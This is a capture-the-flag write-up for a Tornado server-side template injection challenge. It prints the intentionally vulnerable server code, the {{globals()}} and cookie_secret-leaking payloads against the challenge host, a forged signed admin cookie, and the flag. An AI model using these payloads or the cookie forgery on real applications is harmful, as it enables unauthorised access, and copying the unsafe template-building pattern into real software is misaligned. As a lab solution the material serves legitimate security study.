# The Usual Suspects

Author: [SrishtiGohain](https:github.com/SrishtiGohain)

## Description

This is a simple Server Side Template Injection challenge.

## Requirements

- Python
- tornado

## Sources

```
You may think I walk with no 'name' because it can be changed whenever I want. I am a 'person' whose 'secret' can never be found. Can you find this 'person's 'secret'?
(I love you 8000.)
```

## Exploit

```python
#SOURCE CODE: server.py
import tornado.template
import tornado.ioloop
import tornado.web
import os, pwd, grp

def drop_privileges(uid_name='ctf', gid_name='ctf'):
    running_uid = pwd.getpwnam(uid_name).pw_uid
    running_gid = grp.getgrnam(gid_name).gr_gid

    os.setgroups([])

    os.setgid(running_gid)
    os.setuid(running_uid)

    old_umask = os.umask(0o077)


flag = open('rf.txt').read()
secret = open('cs.txt').read()

TEMPLATE = '''
<html>
 <head><title> 🐱‍👤Hello Hacker</title></head>
 <body style="background: #00FFFF;text-align:center;">
 <h1 style="font-size:5rem;"> 🐱‍👤 The Usual Suspects 🐱‍👤 </h1>
 <br />
 <h2 style="font-size:4rem;"> You Have Arrived! </h2>
 <br />
 <p style="font-size:2rem;"> 
 <p>Hey, wanna know how I rate some ice-cream flavours?</p>
 <form method="GET"  action='/'>
  <select id="icecream" name="icecream">
      <option value="{{!chocolate}}">chocolate</option>
      <option value="{{!vanilla}}">vanilla</option>
      <option value="{{!butterscotch}}">butterscotch</option>
  </select>
  <input type="submit"></input>
 </form>
 <p>FOO</p>
 </p>
 <br/> <br/>
 <p style="text-align:center; font-size:2rem;">
 Oh I heard you're looking for my secret. <br>
 <b>{{secret}}</b>
 </p>
 </body>
</html>
'''

class MainHandler(tornado.web.RequestHandler):
 
    def get(self):

        chocolate = "My fav!! 10/10, would eat again"
        vanilla = 'Vanilla is good too, but could be better, i give it a 7/10'
        butterscotch = 'Yuck, who even likes that. 1/10'
        
        template_data = TEMPLATE.replace("FOO",self.get_argument('icecream',''))
        t = tornado.template.Template(template_data)
        secret = "Unfortunately, you aren't worthy"
        if self.get_secure_cookie("admin")==b"true":
            secret = flag
        else:
            self.set_secure_cookie("admin", "false")
        self.write(t.generate(chocolate=chocolate,vanilla=vanilla, butterscotch=butterscotch, application=application, secret=secret))



application = tornado.web.Application([
    (r"/", MainHandler)
], debug=True, static_path=None, template_path=None, cookie_secret=secret)

if __name__ == '__main__':
    drop_privileges()
    application.listen(9999)
    print("Listening :)")
    tornado.ioloop.IOLoop.instance().start()
```
<br />

- The server script runs on `http://chall.csivit.com:30279/`. Input is taken as the "icecream" value. 
 
- A secure cookie is being set and compared to print a flag value. In tornado, signed cookies contain the encoded value of the cookie
  alongwith a timestamp and an HMAC signature. Such cookies are supported by the set_secure_cookie and get_secure_cookie methods which require a specific secret key: cookie_secret.

- Upon visiting `http://chall.csivit.com:30279/?icecream={{globals()}}`, you see something useful:

```
'application': <tornado.web.Application object at 0x7f2976579750>,
```

- You now know that the name of the variable `tornado.web.Application(...)` is `application`.

- Run the server script with the exploit payload `http://chall.csivit.com:30279/?icecream={{application.settings["cookie_secret"]}}` to get the cookie_secret value `MangoDB` displayed on the website.
  
- Replace the value of the secure cookie `admin` to the required comparison value `true` to obtain a signed cookie on the browser. Now, replace the signed cookie generated upon running the server script with the one obtained after the secure cookie value was set to `true`. This results in a cookie which looks like the following. Note `dHJ1ZQ==` is base64 for `true`.

```
"2|1:0|10:1594808471|5:admin|8:dHJ1ZQ==|5da7d1e446451e825e42001e7f07360e2e2e77c9c68b14fca1a517259712cdac"
```

- Upon reloading the server script, the text on the website would change from `Unfortunately, you aren't worthy` to the flag value:

```
csictf{h3r3_i_4m}
```


The flag is:
```
csictf{h3r3_i_4m}
```
